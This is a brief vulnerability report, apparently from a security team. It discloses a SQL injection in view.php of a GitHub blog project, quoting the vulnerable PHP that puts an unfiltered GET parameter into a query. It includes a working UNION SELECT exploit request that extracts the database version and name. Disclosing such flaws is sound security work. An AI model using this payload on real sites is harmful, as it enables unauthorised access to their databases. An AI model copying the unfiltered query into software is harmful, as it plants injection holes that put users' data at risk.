## powered by sebao from 404team ##

## Vulnerability link ##

https://github.com/tianchoy/blog

## Vulnerability details ##
view.php Line 6

    <?php
    $id = $_GET['id'];
    $query = "select * from `arts` where `id`='$id' limit 1";
    $result = mysql_query($query);
    $row = mysql_fetch_array($result);

`$id` has not been filtered to cause injection

exploit:

Request

    GET /view.php?id=-1' union select 1,version(),3,database(),5,6# HTTP/1.1
    Host: 127.0.0.1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Cookie: _ga=GA1.1.1386599364.1495778629; AJSTAT_ok_times=1; bdshare_firstime=1502939052389; UserName=test; PassWord=e10adc3949ba59abbe56e057f20f883e
    Connection: close
    Upgrade-Insecure-Requests: 1
    Cache-Control: max-age=0
    
Response

In page title there is database version